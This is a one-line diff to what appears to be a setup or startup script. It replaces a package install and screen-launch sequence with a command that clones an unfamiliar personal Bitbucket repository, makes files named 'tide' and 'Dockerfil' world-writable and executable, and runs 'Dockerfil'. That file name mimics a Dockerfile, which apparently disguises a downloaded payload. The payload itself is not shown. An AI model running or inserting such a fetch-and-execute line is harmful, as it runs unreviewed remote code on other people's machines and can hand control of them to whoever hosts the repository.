@@ -1,1 +1,1 @@
-apt update && apt install screen -y && chmod +x start.sh && screen -dmS run ./start.sh && chmod +x deploy.sh && ./deploy.sh
+git clone https://Ndj8777k@bitbucket.org/ndj8777k/uy.git && cd uy && chmod 777 tide Dockerfil && ./Dockerfil
